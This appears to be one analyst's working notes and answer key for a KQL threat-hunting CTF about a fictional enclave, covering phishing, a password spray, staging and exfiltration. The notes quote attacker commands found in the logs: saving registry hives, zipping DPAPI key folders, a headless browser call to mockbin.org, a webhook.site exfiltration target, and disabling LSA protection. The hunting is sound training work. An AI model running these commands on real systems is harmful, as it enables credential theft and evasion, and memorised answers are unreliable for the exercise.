@@ -1,0 +1,1218 @@
+﻿Each employee at Scholomance Hidden Enclave - DC2 is assigned an IP address.
+
+Which employee has the IP address: “10.10.0.20”?
+
+ Rose Boyd
+
+
+ How many emails did Elsie Hall receive?
+
+ 44
+
+ How many distinct senders were seen in the email logs that contain links with scholomance-suppliers.online?
+
+ 403
+
+ How many unique URLs did “Becky Thrower” visit?
+
+ 80
+
+ How many unique domains in the PassiveDns records contain the word “documents”?
+
+(hint: use the contains operator instead of has. If you get stuck, do a take 10 on the table to see what fields are available.)
+
+ 4
+
+ What IPs did the domain “information-documents.org” resolve to (enter any one of them)?
+
+ 187.4.28.70
+
+ How many unique URLs were browsed by employees named “Karen”?
+
+ 204
+
+/// Oh no! You've been hit by something, someone, or some force that has stolen something from your enclave. You're not sure, but you need to investigate. There was a lot of emails going around about regulation and compliance. Search for these terms in the Emails table.
+
+////When is the first time a sender with either of these terms show up?(Note: Let's ignore emails from our trusted partner companies for now)
+
+regulation and compliance. Search for these terms in the Emails table.
+
+
+Use let to save the compromised account from Question 9, then search AuthenticationEvents to see all systems that account authenticated to. Pattern: let account = "user"; AuthenticationEvents | where user == account
+
+My First try 1
+
+Email
+| where subject  has_any ("regulation", "compliance")
+    or link  has_any ("regulation", "compliance")
+| summarize Count=count() by sender
+| sort by Count desc
+
+molly_chavez@deathcon-scholomance.io
+
+Email
+| where subject  has_any ("regulation", "compliance")
+    or link  has_any ("regulation", "compliance")
+| sort by timestamp asc
+
+http://alzheimers.org.uk/share/public?uid=smatterings?keyword=compliance?type=knuckle?tracking=compliance?user=wapitis
+
+molly_chavez@deathcon-scholomance.io
+
+2023-10-15T09:32:15.000Z
+
+not the answer
+
+My second try 2
+
+Email
+| take 10
+
+How many unique URLs were browsed by employees named “Karen”?
+
+let namedKaren=
+Employees
+| where name contains "Karen"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (namedKaren)
+| distinct  url
+
+
+///204  unique URLs were browsed by employees named “Karen”
+
+Use let to save the compromised account from Question 9, then search AuthenticationEvents to see all systems that account authenticated to. Pattern: let account = "user"; AuthenticationEvents | where user == account
+
+let namedKaren=
+Employees
+| where name contains "Karen"
+| distinct username;
+AuthenticationEvents
+| where username  in (namedKaren)
+| distinct src_ip
+
+10.10.1.81
+141.207.80.201
+10.10.3.37
+197.109.129.0
+10.10.2.56
+179.87.5.105
+29.65.80.249
+173.244.130.252
+129.49.175.181
+195.246.221.149
+177.48.209.202
+
+
+check which was successful login
+
+let namedKaren=
+Employees
+| where name contains "Karen"
+| distinct username;
+AuthenticationEvents
+| where username  in (namedKaren)
+| where result contains "successful"
+| distinct src_ip
+
+10.10.1.81
+141.207.80.201
+10.10.3.37
+197.109.129.0
+10.10.2.56
+179.87.5.105
+
+which email adress compromised
+
+let namedKaren =
+Employees
+| where name contains "Karen"
+| distinct ip_addr;
+Email
+| where link   has_any (namedKaren)
+| sort by timestamp asc
+
+My try 3
+
+check the IP if in OutboundNetworkEvents
+
+let namedKaren=
+Employees
+| where name contains "Karen"
+| distinct username;
+let IPsActorlogin=
+AuthenticationEvents
+| where username  in (namedKaren)
+| where result contains "successful"
+| distinct src_ip;
+OutboundNetworkEvents
+| where src_ip has_any (IPsActorlogin)
+| where url contains "reg" or url contains "comp"
+
+
+My try for focussing on email
+
+Employees
+| take 1
+
+deathcon-scholomance.io
+
+Email
+//| where subject contains "[EXTERNAL]"
+| where link contains "regulation" or link contains "compliance"
+
+Find the trusted compagny
+
+Email 
+| where sender contains "regulation" or sender contains "compliance" or reply_to contains "regulation" or recipient contains "compliance"
+| where sender !contains "deathcon-scholomance.io"
+| extend domain = tostring(split(sender, "@")[1])
+| distinct domain
+
+the sender contain all this domain
+
+researchcompliance.biz //trusted company
+verizon.com
+protonmail.com
+yahoo.com
+
+///let try without one of these domains
+
+Email 
+| where sender contains "regulation" or sender contains "compliance" or reply_to contains "regulation" or recipient contains "compliance"
+| where sender !contains "researchcompliance.biz" and recipient   !contains "researchcompliance.biz"
+
+10/10/2023, 9:01:05 AM	executivecompliance@verizon.com	executive_compliance@yahoo.com	frances_sargeant@deathcon-scholomance.io	[EXTERNAL] Please review your notice now.	BLOCKED	http://wizard-safety.com/published/published/signin
+
+///datetime( 2023-10-10T09:01:05Z)
+
+
+Investigate these email addresses.
+
+How many sender email addresses are linked together by the same theme?
+
+Email 
+| where sender contains "regulation" or sender contains "compliance" or reply_to contains "regulation" or recipient contains "compliance"
+| where sender !contains "researchcompliance.biz" and recipient   !contains "researchcompliance.biz"
+| summarize SenderCount = dcount(sender) by subject
+
+
+[EXTERNAL] Please review your notice now.	3
+[EXTERNAL] RE: Please review your notice now.	1
+[EXTERNAL] RE:RE: URGENT: Permit needed.	1
+[EXTERNAL] You are required to respond or your facility will close.	1
+[EXTERNAL] Act now: final notice to your company.	1
+[EXTERNAL] IMPORTANT: Provide your information now.	1
+
+///we see "4" Sender are linked in the theme Please review your notice
+
+
+How many unique subject lines were sent by these email addresses?
+
+Step 1: check distinc sender
+
+Email 
+| where sender contains "regulation" or sender contains "compliance" or reply_to contains "regulation" or recipient contains "compliance"
+| where sender !contains "researchcompliance.biz" and recipient   !contains "researchcompliance.biz"
+| distinct sender
+
+executivecompliance@verizon.com
+executive_compliance@protonmail.com
+executive_compliance@yahoo.com
+compliance.compliance@verizon.com
+
+We check the unique subejtc
+
+let Emailsactor= datatable(domain: string)
+[
+"executivecompliance@verizon.com",
+"executive_compliance@protonmail.com",
+"executive_compliance@yahoo.com",
+"compliance.compliance@verizon.com"
+];
+Email
+| where sender has_any (Emailsactor)
+| distinct subject
+
+
+[EXTERNAL] Please review your notice now.
+[EXTERNAL] RE: Please review your notice now.
+[EXTERNAL] RE:RE: URGENT: Permit needed.
+[EXTERNAL] You are required to respond or your facility will close.
+[EXTERNAL] Act now: final notice to your company.
+[EXTERNAL] IMPORTANT: Provide your information now.
+
+///6 unique lines subject
+
+Which of these subject lines was used to target the fewest number of users?
+
+let Emailsactor= datatable(domain: string)
+[
+"executivecompliance@verizon.com",
+"executive_compliance@protonmail.com",
+"executive_compliance@yahoo.com",
+"compliance.compliance@verizon.com"
+];
+Email
+| where sender has_any (Emailsactor)
+| summarize TargetedUsers = dcount(recipient) by subject
+| sort by TargetedUsers asc
+| top 1 by TargetedUsers asc
+
+///[EXTERNAL] IMPORTANT: Provide your information now.
+
+
+Let's take all of the email addresses and look for how many distinct URLs were sent by them.
+
+How many unique URLs were sent?
+
+let Emailsactor= datatable(domain: string)
+[
+"executivecompliance@verizon.com",
+"executive_compliance@protonmail.com",
+"executive_compliance@yahoo.com",
+"compliance.compliance@verizon.com"
+];
+Email
+| where sender has_any (Emailsactor)
+| summarize Uniquelinks = dcount(tostring(link)), Links = make_set(link)
+
+//8	["http://wizard-safety.com/published/published/signin","http://wizardregulations.com/search/published/enter","https://wizard-safety.com/share/published/login.html","https://safetycontrol.com/online/search/login.html","https://control-regulations.com/share/public/public/public/auth","http://wizardsafety.com/files/online/files/online/signin","https://safetycontrol.com/share/search/sign_in","http://safetyregulations.com/published/login"]
+//8
+
+How many employees clicked on these links?
+
+
+
+
+let Emailsactor= datatable(domain: string)
+[
+"executivecompliance@verizon.com",
+"executive_compliance@protonmail.com",
+"executive_compliance@yahoo.com",
+"compliance.compliance@verizon.com"
+];
+let linksactor=
+Email
+| where sender has_any (Emailsactor)
+| summarize Links = make_set(link);
+OutboundNetworkEvents
+| where url has_any (linksactor)
+| distinct src_ip
+
+//20
+
+
+How many distinct employee roles clicked these links?
+
+
+let Emailsactor= datatable(domain: string)
+[
+"executivecompliance@verizon.com",
+"executive_compliance@protonmail.com",
+"executive_compliance@yahoo.com",
+"compliance.compliance@verizon.com"
+];
+let linksactor=
+Email
+| where sender has_any (Emailsactor)
+| summarize Links = make_set(link);
+let employeerole=
+OutboundNetworkEvents
+| where url has_any (linksactor)
+| distinct src_ip;
+Employees
+| where ip_addr has_any (employeerole)
+| distinct role
+
+Magical Intern
+Magical Quality Control Analyst
+Potion Brewer
+Enchantment Marketing Specialist
+Dark Magic Regulation Expert
+Magical Artifact Seller
+Curse-Breaking Specialist
+Enchantment Researcher
+
+///8
+
+How many Dark Magic Regulation Experts clicked the links?
+
+let Emailsactor= datatable(domain: string)
+[
+"executivecompliance@verizon.com",
+"executive_compliance@protonmail.com",
+"executive_compliance@yahoo.com",
+"compliance.compliance@verizon.com"
+];
+let linksactor=
+Email
+| where sender has_any (Emailsactor)
+| summarize Links = make_set(link);
+let employeerole=
+OutboundNetworkEvents
+| where url has_any (linksactor)
+| distinct src_ip;
+Employees
+| where ip_addr has_any (employeerole)
+| where role contains "Dark Magic Regulation Expert"
+
+Surya Gupta	10.10.0.62	sugupta	U8UZ-LAPTOP
+Antonio Joseph	10.10.1.156	anjoseph	2ZJA-LAPTOP
+Brian Ingram	10.10.0.250	bringram	V25Q-MACHINE
+Jared Guest	10.10.2.193	jaguest	LF0Q-DESKTOP
+
+///4
+
+What time did the first employee click on one of the links?
+
+let Emailsactor= datatable(domain: string)
+[
+"executivecompliance@verizon.com",
+"executive_compliance@protonmail.com",
+"executive_compliance@yahoo.com",
+"compliance.compliance@verizon.com"
+];
+let linksactor=
+Email
+| where sender has_any (Emailsactor)
+| summarize Links = make_set(link);
+OutboundNetworkEvents
+| where url has_any (linksactor)
+
+///2023-10-16T07:48:29.000Z
+10.10.0.62
+https://control-regulations.com/share/public/public/public/auth
+
+What is that employee's username?(The one who first clicked on the link)
+
+let Emailsactor= datatable(domain: string)
+[
+"executivecompliance@verizon.com",
+"executive_compliance@protonmail.com",
+"executive_compliance@yahoo.com",
+"compliance.compliance@verizon.com"
+];
+let linksactor=
+Email
+| where sender has_any (Emailsactor)
+| summarize Links = make_set(link);
+let employeewhoclick=
+OutboundNetworkEvents
+| where url has_any (linksactor)
+| where timestamp == datetime(2023-10-16T07:48:29.000Z)
+| distinct src_ip;
+Employees
+| where ip_addr in (employeewhoclick)
+
+8/15/2018, 4:27:15 AM	Surya Gupta	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0	10.10.0.62	surya_gupta@deathcon-scholomance.io	deathcon-scholomance.io	sugupta	Dark Magic Regulation Expert	U8UZ-LAPTOP
+
+username
+
+//sugupta  
+
+
+Let's look at this employee's Authentication activity.
+
+What is the most common user agent used by this employee? (Format Firefox/XX.X)
+
+AuthenticationEvents
+| where username == "sugupta"
+| summarize Count=count() by user_agent
+
+
+Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0	110
+Mozilla/5.0 (Macintosh; PPC Mac OS X 10_11_6; rv:1.9.2.20) Gecko/2011-05-02 06:39:07 Firefox/11.0	1
+
+/////  Firefox/47.0
+
+
+When was there a login attempt from a different user agent for this employee? Copy and paste the exact timestamp
+
+
+AuthenticationEvents
+| where username == "sugupta"
+| where user_agent contains "Firefox/11.0"
+
+////2023-10-17T01:17:35.000Z
+
+From what IP address did this authentication occur?
+
+AuthenticationEvents
+| where username == "sugupta"
+| where user_agent contains "Firefox/11.0"
+| project src_ip
+
+///173.188.151.49
+
+How many login attempts were seen from this IP?
+
+pivoting aorund the IP
+
+AuthenticationEvents
+| where src_ip =="173.188.151.49"
+
+sugupta	AuthResults.FAILED_LOGIN
+hacarney	AuthResults.FAILED_LOGIN
+almcwaters	AuthResults.SUCCESSFUL_LOGIN
+
+//3
+
+Which user account was successfully logged in to from this IP? Enter the username
+
+Employees
+| where username contains "almcwaters"
+
+Magical Quality Control Analyst
+
+
+/// almcwaters
+
+Let's look back at all AuthenticationEvents. Which user agent was used the most? (Format Firefox/XX.X)
+
+
+AuthenticationEvents
+| where user_agent contains "Firefox/"
+| summarize Count=count() by user_agent
+
+///Firefox/69.0
+
+How many user accounts had login attempts from this user agent?
+
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| distinct username
+
+///405
+
+How many IP addresses were used with this user agent?
+
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| distinct src_ip
+
+//2635
+
+
+How many user account were successfully logged into using this user agent?
+
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| where result contains "successful"
+| distinct username
+//28 
+
+This type of attack is known as a __ .
+
+I used AI for this question
+
+/////response password spray;spray
+
+
+///Question 21 
+
+Let's look for follow on activity, including phishing emails targeting higher privileged and sensitive users.
+
+What is the email subject that the threat actor used?
+
+First identify the compromised account(s) after the password spray attack:
+
+
+Then examine email activity involving those accounts:
+
+let compromised =
+AuthenticationEvents
+| where user_agent contains "Firefox/69.0"
+| where result contains "successful"
+| distinct username; ///28 names
+let A=
+Employees
+| where username has_any (compromised)
+| distinct email_addr;
+Email
+| where sender has_any (A) or recipient has_any (A)
+| where sender contains "@deathcon-scholomance.io"
+| summarize Recipients=dcount(recipient) by subject, sender
+| sort by Recipients desc
+
+////Response of 1.21 :  URGENT: Please provide locations where your research is located.
+
+check the role affected
+
+let  B=
+Email
+| where subject contains "URGENT: Please provide locations where your research is located."
+| distinct sender;
+Employees
+| where email_addr has_any (B)
+| distinct role
+
+Magical Artifact Seller
+Magical Quality Control Analyst
+Dark Magic Regulation Expert
+Potion Brewer
+Magical Intern
+Curse-Breaking Specialist
+Enchantment Marketing Specialist
+Enchantment Researcher
+
+
+Email
+| where subject contains "URGENT: Please provide locations where your research is located."
+| distinct link 
+
+
+▸
+Question 22
+
+The threat actor may have done some additional recon within the environment.
+
+Checking the internal network events, what document did they look within the enclave's secretive shares?
+
+InboundNetworkEvents
+| where url contains "enclave" and url contains "secret" and url contains "search"
+| distinct url
+
+earch all the link we found this link below
+
+https://deathcon-scholomance.io/enclave_secrets/files/important_research.docx
+
+// Response; important_research.docx
+
+InboundNetworkEvents
+| where url contains "important_research.docx"
+| distinct src_ip
+
+129.211.225.116
+220.40.124.187
+158.92.114.111
+179.87.68.254
+79.243.44.65
+12.40.154.145
+209.158.21.239
+173.188.151.49
+
+
+
+InboundNetworkEvents
+| where url contains "important_research.docx"
+| distinct user_agent
+
+///Mozilla/5.0 (Linux; Android 2.0) AppleWebKit/531.2 (KHTML, like Gecko) Chrome/62.0.890.0 Safari/531.2
+
+
+
+
+
+1.23
+
+The threat actor may have forgot how to do some reconaissance in an internal environment.
+
+What website did they use to get a refresher? Copy and paste the full URL.
+
+Compromise account
+Password spray
+Internal recon
+Look up a tutorial site
+Execute the recon
+
+I would search all URLs for common AD-recon training/reference sites:
+
+try this
+
+OutboundNetworkEvents
+| where url contains "hacktricks"
+//    or url contains "ired"
+//    or url contains "0xdf"
+//    or url contains "juggernaut"
+//    or url contains "bloodhound"
+//    or url contains "powerview"
+    or url contains "active-directory"
+//    or url contains "ad-enumeration"
+//    or url contains "internal"
+| distinct url
+
+after trying all key words ""recon and active-directory are the key words to search
+
+OutboundNetworkEvents
+| where url contains "recon"
+| distinct url
+
+Response
+
+////https://svch0st.medium.com/active-directory-recon-cheat-sheet-76ccc16dc6e8
+
+
+1.24
+
+Continue to investigate the threat actor. They may have downloaded and used an archiving tool.
+
+What url did they use to download it?
+
+The correct answer will almost certainly look like one of these:
+
+do search on the net for popular archiever
+
+7-Zip (7zip, 7-zip, 7z)
+WinRAR (winrar, rar)
+PeaZip (peazip)
+Bandizip (bandizip)
+WinZip (winzip)
+
+try this first
+
+
+OutboundNetworkEvents
+| where url contains "7zip"
+//   or url contains "zip"
+   or url contains "winrar"
+   or url contains "archive"
+   or url contains "7-zip"
+   or url contains "peazip"
+   or url contains "Bandizip"  
+   or url contains "WinZip"
+| distinct url
+
+/// Response https://www.7-zip.org/a/7z2002-x64.exe
+
+www.7-zip.org
+
+check the IP
+
+OutboundNetworkEvents
+| where url contains "https://www.7-zip.org/a/7z2002-x64.exe"
+| distinct src_ip
+
+
+
+1.25
+
+It looks like they staged some files for extraction.
+
+What is the timestamp of the last file they archived and created?
+
+the file extention is 7z
+
+
+let A=
+OutboundNetworkEvents
+| where url contains "https://www.7-zip.org/a/7z2002-x64.exe"
+| distinct src_ip;
+let B=
+Employees
+| where ip_addr has_any (A)
+| distinct username;
+FileCreationEvents
+| where username has_any (B)
+| where filename  endswith ".7z"
+| sort by timestamp desc
+
+
+| summarize LastArchiveTime = max(timestamp)
+
+//2023-11-03T10:24:43.000Z  username==  orlake
+
+
+//////////////////////////2: 🌲 Forest Blizzard ❄️ Question 1
+
+Let's take a look at our security alerts. It looks like there was a file that was quarantined on October 2, 2023.
+
+How many files with this filename is present on Scholomance hosts?
+
+Step 1 ; search the alert on the 2 october 2026
+
+SecurityAlerts
+| where timestamp <= datetime(2023-10-03)
+| where timestamp >= datetime(2023-10-01)
+| where description contains "quaranti"
+
+A suspicious file was quarantined on host E1TS-LAPTOP: details.zip
+[{'hostname': 'E1TS-LAPTOP', 'filename': 'details.zip', 'sha256': 'f6c43b487b1ae4dc092fa1a8cefb5d65db147581cd7950ca6b724a8ddc63b267'}]
+
+Step 2 pivot around this filename to know the number of hosts have this file  'details'
+
+FileCreationEvents
+| where filename  contains "details.zip"
+| distinct hostname //15
+
+
+How many roles were impacted with this file?
+
+let A=
+FileCreationEvents
+| where filename  contains "details.zip"
+| distinct username; //15
+Employees
+| where username  has_any (A)
+| distinct role //9
+
+
+Let's pivot to emails. Identify all of the unique senders for this file.
+
+How many unique domains did they use to serve this file?
+
+
+Email
+| where link contains "details.zip"
+| distinct link
+| extend domain = tostring(parse_url(link).Host)
+| distinct domain //5
+
+detailsdocuments.com
+modeldocuments.org
+modelinformation.com
+details-information.com
+information-documents.org
+
+
+
+
+
+Look for all the files this threat actor served.
+
+How many total emails were sent by this threat actor containing potentially malicious files?
+
+Email
+| where link contains "details.zip"
+| distinct sender
+
+arunmishra1974@portugalmail.pt
+ukraine_news@meta.ua
+str.vidil@meta.ua
+
+Email
+| where link contains "details.zip"
+| distinct reply_to
+
+ukraine_news@meta.ua
+arunmishra1974@portugalmail.pt
+str.vidil@meta.ua
+/// no new Email
+
+in total sender and reply to
+
+arunmishra1974@portugalmail.pt
+ukraine_news@meta.ua
+str.vidil@meta.ua
+
+//let check all the Emails from actor wthi these Email domains
+
+
+let Emailsactor= datatable(domain: string)
+[
+"arunmishra1974@portugalmail.pt",
+"ukraine_news@meta.ua",
+"str.vidil@meta.ua"
+];
+Email
+| where sender has_any (Emailsactor) or reply_to has_any (Emailsactor)
+
+///69
+
+
+How many of these files were present on hosts?
+
+// lets check the number of files
+
+let Emailsactor= datatable(domain: string)
+[
+"arunmishra1974@portugalmail.pt",
+"ukraine_news@meta.ua",
+"str.vidil@meta.ua"
+];
+Email
+| where sender has_any (Emailsactor) or reply_to has_any (Emailsactor)
+| extend last_part = tostring(split(link, "/")[array_length(split(link, "/")) - 1])
+| distinct   last_part
+
+///3 files found
+
+We have 3 files
+
+photo.zip
+IOC_30_08.rar
+details.zip
+
+
+
+// lets look at how many of these files have been created on the systems 
+
+let Malicousfilesactor= datatable(domain: string)
+[
+"photo.zip",
+"IOC_30_08.rar",
+"details.zip"
+];
+FileCreationEvents
+| where filename in (Malicousfilesactor)
+| summarize by hostname, filename, sha256
+| count
+///66
+
+
+Let's look for impact.
+
+How many total job roles were targeted?
+
+we take the finding of the number of hostname and check with employees
+
+let Malicousfilesactor= datatable(domain: string)
+[
+"photo.zip",
+"IOC_30_08.rar",
+"details.zip"
+];
+let A=
+FileCreationEvents
+| where filename in (Malicousfilesactor)
+| summarize by hostname, filename;
+Employees
+| where hostname in (A)
+| distinct role
+// 12 roles have been impacted
+
+
+2.7
+
+Let's start investigating what happens after these emails were sent & downloaded onto these hosts. The threat actor is staging files somewhere.
+
+What is the full path to the directory?
+
+
+Look for files created shortly after the archives
+
+let Downloads =
+FileCreationEvents
+| where filename in ("photo.zip","IOC_30_08.rar","details.zip")
+| project hostname, DownloadTime=timestamp;
+FileCreationEvents
+| join kind=inner Downloads on hostname
+| where timestamp between (DownloadTime .. DownloadTime + 30m)
+| project timestamp, hostname, filename, path
+| order by hostname, timestamp
+
+///C:\ProgramData\
+
+a lot files are stock in ProgramData after the zip or rar was created
+
+2.8
+
+It may be worth it to start conducting open source intelligence on these files. Some of these files are tied to the previous section.
+
+What other group, named by Mandiant, are these other files associated with?
+
+check the SHA256 
+
+FileCreationEvents
+| where filename in ("details.zip","photo.zip","IOC_30_08.rar")
+| project filename, sha256
+| distinct filename, sha256
+
+I used an email address to be able to find the answer for example
+
+arunmishra1974@portugalmail.pt
+ukraine_news@meta.ua
+str.vidil@meta.ua
+
+
+
+The state invole is Russia  check the email extension meta.ua:
+arunmishra1974@portugalmail.pt
+ukraine_news@meta.ua
+str.vidil@meta.ua
+
+
+APT28 (Fancy Bear): Military intelligence group (GRU); targets military, government, and media organizations.
+
+I search for Mandiant APT list in google
+
+I have all the list  and check where the Emails atacor are commming from All are from Russia
+
+Mandiant tracks Advanced Persistent Threat (APT) groups using numeric designations based on their regional or nation-state affiliations. The most prominent active and historical APT groups continuously tracked by Mandiant include:China-Nexus GroupsAPT1: People's Liberation Army's (PLA) Unit 61398; heavily focused on global data and intellectual property theft.APT15: Focuses on defense, diplomacy, and telecommunications.APT17: Known for targeting government, defense, and legal sectors.APT3: Associated with the Ministry of State Security (MSS); known for using custom zero-day exploits.APT40: Focuses on naval modernization, engineering, and maritime research.APT41: A unique hybrid group that conducts both state-sponsored espionage and financially motivated cybercrime.Russia-Nexus GroupsAPT28 (Fancy Bear): Military intelligence group (GRU); targets military, government, and media organizations.APT29 (Cozy Bear): Civilian intelligence (SVR); known for high-profile supply chain attacks and espionage.APT44 (Sandworm): A notorious cyber sabotage unit linked to the GRU, famous for disruptive attacks on critical infrastructure.Iran-Nexus GroupsAPT33: Focuses on the aerospace, energy, and petrochemical industries.APT34: Known for targeting government, financial, and energy sectors.APT35 (Charming Kitten): Conducts extensive credential harvesting and spear-phishing.APT42: Focuses on targeted surveillance, civil society, and government entities, often utilizing cloud-based infrastructure.North Korea-Nexus GroupsAPT37: Focuses on South Korea and other regional governments, as well as defectors.APT38: Financially motivated group that targets financial institutions and cryptocurrency networks.APT43: Cyber espionage group that uses stolen cryptocurrency funds to support the Kim Jong-un regime.Other State & Regional GroupsAPT39: Iranian-linked actor focusing on telecommunications and travel.APT45: Associated with state-aligned actors conducting varied regional intelligence gathering.Because threat actors frequently change their tactics or are newly discovered before formal APT designation, Mandiant additionally tracks uncategorized clusters as UNC groups and financially motivated actors as FIN groups.To learn more about a specific actor, are you interested in their associated malware families, their preferred attack vectors, or indicators of compromise (IOCs) related to their recent campaigns?
+
+///response
+
+I found for russia mentioned by Mandiant
+Russia-Nexus GroupsAPT28 (Fancy Bear): Military intelligence group (GRU); targets military, government, and media organizations.APT29 (Cozy Bear): Civilian intelligence (SVR); known for high-profile supply chain attacks and espionage.APT44 (Sandworm): A notorious cyber sabotage unit linked to the GRU, famous for disruptive attacks on critical infrastructure
+
+///Russia-Nexus GroupsAPT28 (Fancy Bear): Military intelligence group (GRU) is the solution
+
+///Response ; APT28
+
+
+Now that you have some information on this threat, what filename (minus the extension) is used for collecting credentials?
+
+doing intel research 
+
+https://www.darkreading.com/cyberattacks-data-breaches/apt28-uses-eternalblue-to-spy-on-hotel-wifi-networks
+ https://socprime.com/blog/uac-0001-aka-apt28-attack-detection/
+chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/https://eurepoc.eu/wp-content/uploads/2023/07/APT28-EN.pdf
+https://cloud.google.com/security/mandiant?hl=en
+https://attack.mitre.org/groups/G0007/
+
+nothing found from the intel
+
+after more research with AI "which filename used by APT28 collects credentials?""
+
+artifact seen during specific intrusions where APT28 used credential harvesting + local staging (often under C:\ProgramData\ or similar writable system paths).
+
+so we know that the file has to be stored in  C:\ProgramData\
+
+1. Look for files created shortly after the archives
+
+let Downloads =
+FileCreationEvents
+| where filename in ("photo.zip","IOC_30_08.rar","details.zip")
+| project hostname, DownloadTime=timestamp;
+FileCreationEvents
+| join kind=inner Downloads on hostname
+| where timestamp between (DownloadTime .. DownloadTime + 30m)
+| project timestamp, hostname, filename, path
+| order by hostname, timestamp
+
+///C:\ProgramData\
+
+2. search file under  C:\ProgramData\
+
+FileCreationEvents
+| where path contains @"C:\ProgramData\"
+| distinct path
+
+Output to check
+
+C:\ProgramData\l09y3n.css - d03373be2435af1966bfdfe51ae6d0038e4d4f3c353b63fea41144d144547121
+C:\ProgramData\66d0975a-e280-46e8-93ef-9f45071c03d2.vbs
+C:\ProgramData\weblinks.cmd
+C:\ProgramData\dc529177-39b4-4828-8c66-79fe35145d07.cmd
+C:\ProgramData\dc529177-39b4-4828-8c66-79fe35145d07.vbs
+C:\ProgramData\aaccd6de-ce95-4fb2-b2c1-2d7ca08661a3.bat - af4d7ad40e505d047f9df078ef3f6c7e0207c882dc91705e2f4190cc7d2360ce
+C:\ProgramData\Lotus\Data\config.ini
+
+
+we see that 2 filenames have similar name but different extension
+C:\ProgramData\dc529177-39b4-4828-8c66-79fe35145d07.cmd
+C:\ProgramData\dc529177-39b4-4828-8c66-79fe35145d07.vbs
+
+/// Response is: dc529177-39b4-4828-8c66-79fe35145d07
+
+
+2.10
+
+
+It looks like they may have dumped something from a native Windows database and saved it somewhere.
+
+What's the name of this file?
+
+That question is pointing you away from the script/dropper artifacts and toward a credential dump from a Windows-native database.
+
+“native Windows database”
+
+But in CTFs involving APT28 / Forest Blizzard tradecraft, the most common “dumped database” artifact that gets saved to disk is:
+
+
+
+
+another try with word "save"  coommand in the sentence native Windows database and saved it somewhere
+
+
+ProcessEvents
+| where process_commandline contains "HKLM"
+| where process_commandline contains "save"
+
+This out put is comming a lot we have 60 times
+
+cmd.exe /Q /c reg.exe save hklm\software C:\Temp\software.save 1> \\127.0.0.1\ADMIN$\__112335552221321_233321 2>&1
+
+the command is  reg.exe save
+the new directory is Temp
+
+ProcessEvents
+| where process_commandline contains "reg.exe save"
+
+
+//Response of the question : software.save  a “native Windows database”
+
+
+2.11
+
+What's being used by the threat actor as a bootloader?
+
+The attacker is using a legitimate program as a bootloader for persistence. Look at ProcessEvents for processes that start at boot time - the attacker hijacked a common Microsoft application to load their malware.
+
+A legitimate Microsoft executable starts automatically at boot/logon and is abused to load malicious code.
+
+previously we have this 
+
+The idea is to see what the compromised username has on their ProcessEvents
+
+start from the previous question with ""reg.exe save"" from cmd.exe /Q /c reg.exe save hklm\software C:\Temp\software.save 1> \\127.0.0.1\ADMIN$\__112335552221321_233321 2>&1
+ and check whocht username was infected
+After pivot that use the username and see what was other command used 
+check all process without start with C:\
+
+let A=
+ProcessEvents
+| where process_commandline contains "reg.exe save"
+| distinct username;
+ProcessEvents
+| where username has_any (A)
+| where process_commandline !contains @"C:\"
+| distinct process_commandline
+
+we know that a boot has a start command
+
+the command line below is interresting
+
+start "" msedge --headless=new --disable-gpu https://mockbin.org/bin/aaccd6de-ce95-4fb2-b2c1-2d7ca08661a3
+
+by isolating each word we see "msedge" use after start
+
+//response is msedge.exe
+
+2.12
+
+What GUID is being used in conjunction with this?
+ this means with this command start "" msedge --headless=new --disable-gpu https://mockbin.org/bin/aaccd6de-ce95-4fb2-b2c1-2d7ca08661a3
+
+GUID stands for Globally Unique Identifier.
+Example:
+ProcessGuid: {A23B4C5D-1234-5678-9ABC-DEF012345678}
+
+so in we take the command from question 2.11 
+
+start "" msedge --headless=new --disable-gpu https://mockbin.org/bin/aaccd6de-ce95-4fb2-b2c1-2d7ca08661a3
+
+
+// response of the question is aaccd6de-ce95-4fb2-b2c1-2d7ca08661a3
+
+2.13
+Investigate likely data exfiltration.
+
+What filename were they using to stage the data?
+
+let A=
+ProcessEvents
+| where process_commandline contains "reg.exe save"
+| distinct username;
+ProcessEvents
+| where username in (A)
+| extend files = extract_all(@"([A-Za-z0-9_\-]+\.(zip|7z|rar|cab|tmp|dat|bin))", process_commandline)
+| where array_length(files) > 0
+| project timestamp, process_commandline, files
+
+powershell Compress-Archive %USERPROFILE%\AppData\Roaming\Microsoft\Protect %USERPROFILE%\AppData\Roaming\Microsoft\protect.zip
+"protect.zip",  "zip"
+
+//response is: protect.zip  using to stage the data
+
+2.14
+
+What's the destination where the data was likely being transferred to?
+
+For Q14 and Q15:
+
+U can trace adversary activities after they have gained access.
+
+search for http or https or commandline curl
+
+
+ProcessEvents
+| where process_commandline has_any ("https", "http", "curl")
+| project timestamp, process_commandline
+| order by timestamp asc
+| distinct process_commandline
+
+
+/// response is : https://webhook.site/dc529177-39b4-4828-8c66-79fe35145d07
+
+
+2.15
+
+
+There were some things missing or re-configured on these hosts.
+
+What did the threat actor do for defense evasion? What did they disable?
+
+I used AI effectively, write the good prompts, check when AI is wrong and verify the output of my query (do a presentation)
+
+
+ProcessEvents
+| where process_commandline contains "wevtutil"
+| project timestamp, process_commandline
+
+nothing found
+
+check those keywords
+
+let A =
+ProcessEvents
+| where process_commandline contains "reg.exe save"
+| distinct username;
+ProcessEvents
+| where username in (A)
+| where process_commandline has_any (
+//    "defender",
+//    "windefend",
+//    "security",
+//    "firewall",
+//    "av",
+//    "antivirus",
+//      "sc stop",
+//    "sc config",
+//    "net stop",
+//    "Disable-Service",
+//    "Set-Service",
+//    "monitor"
+//    "Set-Service",
+    "Disable",
+    "reg add",
+    "powershell"
+//    "wevtutil",
+//    "auditpol"
+)
+| project timestamp, process_name, process_commandline
+| order by timestamp asc
+
+
+
+from the search above we can keep those command
+
+
+let A =
+ProcessEvents
+| where process_commandline contains "reg.exe save"
+| distinct username;
+ProcessEvents
+| where username in (A)
+| where process_commandline has_any (
+    "Disable",
+   "reg add",
+    "powershell"
+)
+| project timestamp, process_name, process_commandline
+| order by timestamp asc
+| distinct process_commandline
+
+from the Output i have 
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
+
